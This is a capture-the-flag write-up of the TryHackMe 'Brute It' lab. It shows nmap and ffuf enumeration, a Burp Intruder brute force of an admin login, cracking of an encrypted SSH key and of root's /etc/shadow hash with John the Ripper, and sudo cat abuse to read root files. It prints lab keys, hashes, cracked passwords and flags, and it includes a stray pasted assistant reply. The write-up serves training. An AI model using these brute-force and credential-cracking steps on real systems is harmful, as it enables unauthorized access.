
Lab: [Brute It](https://tryhackme.com/room/bruteit)
Tools: 
 - **nmap**:  tool to find open ports, detect operating systems and discover potential vulnerabilities 
 - **gowitness**: command line tool written in Go to capture and screenshot web pages
 - **ffuf**: web fuzzer written in Go to discover hidden or unlinked resources on a web server 
 - **metasploit**:framework for developing, testing, and executing exploits on target systems.
- **ssh2john**: used for extracting password hashes from the OpenSSH private key files.
- **john the ripper**: password cracking software
- **burp suite pro:**
- **foxy proxy:**

After connecting to the network through TryHackMe's VPN. I want to make sure the target is reachable.

```
└─# ping -c 5 10.10.58.60   
PING 10.10.58.60 (10.10.58.60) 56(84) bytes of data.
64 bytes from 10.10.58.60: icmp_seq=1 ttl=61 time=192 ms
64 bytes from 10.10.58.60: icmp_seq=2 ttl=61 time=191 ms
64 bytes from 10.10.58.60: icmp_seq=3 ttl=61 time=189 ms
64 bytes from 10.10.58.60: icmp_seq=4 ttl=61 time=188 ms
64 bytes from 10.10.58.60: icmp_seq=5 ttl=61 time=189 ms

--- 10.10.58.60 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 188.213/189.910/192.094/1.490 ms
                                                           
```
**Host Enumeration**
After confirming that  I can reach the target, I run an nmap scan.


| Nmap Flags | Description |
|----------|----------|
| T5 |Fastest scanning speed | 
| SC | Runs default scripts |
| sV | Version detection on open ports | 

```
nmap -T5 -sC -sV 10.10.58.60    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-28 18:26 EST
Nmap scan report for 10.10.58.60
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.23 seconds

```

**Directory Enumeration (Port 80)**

![http-10 10 58 60-](https://github.com/paRaade/CTF-Writeups/assets/126734769/bd0d49f3-46ae-4cd6-8c6c-5a95f2f0d19c)

Enumerating the website hosted on port 80 reveals a login portal located at  [http]://10.10.58.60/admin/
```
ffuf -w directory-list-2.3-medium.txt:FUZZ -u http://10.10.58.60/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.58.60/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 187ms]

```
![http-10 10 58 60-admin-](https://github.com/paRaade/CTF-Writeups/assets/126734769/ecd4c617-a6ec-4d77-ac6f-5b206f849276)

```
Either [CTRL + U] or Right clicking on the admin portal page and then clicking View Page Source will take us to the folliwing URL, view-source:http://10.10.58.60/admin/ and reveal a comment stating that the username is "admin"


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Admin Login Page</title>
</head>
<body>
    <div class="main">
        <form action="" method="POST">
            <h1>LOGIN</h1>

            
            <p>Username or password invalid</p>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>
``
```

Your instructions are mostly clear, but you can improve the structure for better readability. Here's a refined version:

Configure FoxyProxy to tunnel browser traffic through port 8080, which is the same port used by Burp Suite. Then, enable the intercept feature in Burp Proxy. Finally, log in using 'admin' as the username and any random word as the password.


```
![[Pasted image 20240128184355.png]]
```
Send Response to Burp Intruder
```
![[Pasted image 20240128184548.png]]

```
Highlight password and then click on "Add".
```
![[Pasted image 20240128184826.png]]
```
Click on 'Payloads,' then select 'Add from List' and choose 'passwords.' Turn off 'URL-encode these characters' under Payload encoding. Finally, click on 'Start Attack".
```
![[Pasted image 20240128185019.png]]
![[Pasted image 20240128185115.png]]
```
Sorting by status code shows one payload has an HTTP response code of 302
```
![[Pasted image 20240128185530.png]]

```
Another way to find the correct payload  is to use  "Filter: Showing all items". Each failed login has the following  in its response: <p>Username or password invalid</p>. By clicking on negative search and using that statement it will remove all response that are using invalid credentials
```
![[Pasted image 20240128185802.png]]![[Pasted image 20240128185847.png]]
```

http://10.10.58.60/admin/
```
```
Logging in with the correct  credentials redirects the admin user to http://10.10.58.60/admin/panel/
credentials: admin:xavier


```
![[Pasted image 20240128190213.png]]
```

Clicking on RSA Private Key link redirects the user to http://10.10.58.60/admin/panel/id_rsa
Right click on page then click save as to download the private key

```

![[Pasted image 20240128190558.png]]

```
└─# cat id_rsa               
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA

JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
+Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
-----END RSA PRIVATE KEY-----

To convert the private key to a format that john the ripper can crack use the following command
 ssh2john id_rsa _rsa > id_rsa.hash               

To crack the hash run the following command

 john --wordlist=rockyou.txt id_rsa.hash                  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2024-01-28 19:10) 1.204g/s 87479p/s 87479c/s 87479C/s rubicon..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

john --show id_rsa.hash 
id_rsa:rockinroll

1 password hash cracked, 0 left

Change the permissions of the private key with the following command
chmod 600 id_rsa
                                      


SSH

Login to the target machine
```
└─# ssh -i id_rsa john@10.10.58.60
The authenticity of host '10.10.58.60 (10.10.58.60)' can't be established.
ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.58.60' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 29 00:15:31 UTC 2024

  System load:  0.0                Processes:           105
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 21%                IP address for eth0: 10.10.58.60
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Mon Jan 29 00:14:47 2024 from 10.13.0.39
```
```
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}

```

Privilege Escalation
```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat

```

```
https://gtfobins.github.io/gtfobins/cat/#sudo

john@bruteit:~$ LFILE=/root/root.txt
john@bruteit:~$ sudo /bin/cat "$LFILE"
THM{pr1v1l3g3_3sc4l4t10n}


```
```
john@bruteit:~$ nano run.sh

contents of the file

!/bin/bash

ls -alt /root

john@bruteit:~$ chmod +x run.sh

```

```
john@bruteit:~$ sudo /bin/cat /etc/passwd | head -n 1
root:x:0:0:root:/root:/bin/bash
john@bruteit:~$ sudo /bin/cat /etc/shadow | head -n 1
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```
```
└─# unshadow passwd.txt shadow.txt > unshadowed.txt

└─# john --wordlist=rockyou.txt unshadowed.txt               
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
1g 0:00:00:01 DONE (2024-01-28 19:43) 0.9345g/s 119.6p/s 119.6c/s 119.6C/s 123456..diamond
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

john unshadowed.txt --show                
root:football:0:0:root:/root:/bin/bash

1 password hash cracked, 0 left

john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# whoami
root


```
